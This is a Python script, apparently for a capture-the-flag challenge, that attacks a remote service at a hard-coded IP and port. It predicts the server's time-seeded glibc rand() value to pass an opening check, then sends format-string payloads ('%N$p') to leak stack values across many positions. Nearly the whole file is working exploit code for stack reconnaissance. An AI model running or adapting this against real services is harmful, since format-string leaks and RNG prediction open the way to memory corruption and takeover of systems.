#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""扫描远程 echo_line 的格式化字符串栈布局：每次泄漏 3 个位置，覆盖 %4$ 到 %33$"""
import socket, sys, time, re

HOST, PORT = "103.163.47.230", 35118
M32 = 0xFFFFFFFF


def rand_of(seed):
    r = [0] * 400
    seed &= M32
    if seed == 0:
        seed = 1
    r[0] = seed
    for i in range(1, 31):
        hi, lo = divmod(r[i - 1], 127773)
        w = 16807 * lo - 2836 * hi
        if w < 0:
            w += 2147483647
        r[i] = w & M32
    for i in range(31, 34):
        r[i] = r[i - 31]
    for i in range(34, 344):
        r[i] = (r[i - 31] + r[i - 3]) & M32
    return ((r[344 - 31] + r[344 - 3]) & M32) >> 1


def recv_until(s, marks, timeout=5):
    if isinstance(marks, str):
        marks = [marks]
    buf = b""
    end = time.time() + timeout
    s.settimeout(1.0)
    while time.time() < end:
        for m in marks:
            if m.encode() in buf:
                return buf
        try:
            c = s.recv(4096)
        except socket.timeout:
            continue
        if not c:
            break
        buf += c
    return buf


def run_fmt(fmt, skew):
    s = socket.create_connection((HOST, PORT), timeout=6)
    try:
        recv_until(s, "让游戏开始吧")
        s.sendall(str(rand_of(int(time.time()) + skew)).encode() + b"\n")
        if b"\xe8\xaf\xb4\xe5\x87\xba" not in recv_until(s, ["说出你想要说的话吧", "no"], 4):
            return None
        s.sendall(fmt.encode() + b"\n")
        out = recv_until(s, ["做出你的选择吧"], 4)
        return out
    finally:
        s.close()


def main():
    lo, hi = 4, 40
    for base in range(lo, hi, 3):
        fmt = "%%%d$p.%%%d$p.%%%d$p" % (base, base + 1, base + 2)
        for attempt in range(6):
            skew = 2 if attempt % 2 == 0 else 3
            try:
                out = run_fmt(fmt, skew)
            except Exception as e:
                out = None
            if not out or b"\xe5\x81\x9a\xe5\x87\xba" not in out:
                continue
            line = out.split(b"\n")[0].decode("utf-8", "replace")
            vals = re.findall(r"0x[0-9a-f]+", line)
            print("pos %2d-%2d : %s" % (base, base + 2, "  ".join(vals)), flush=True)
            break
        else:
            print("pos %2d-%2d : (未取到)" % (base, base + 2), flush=True)


if __name__ == "__main__":
    main()
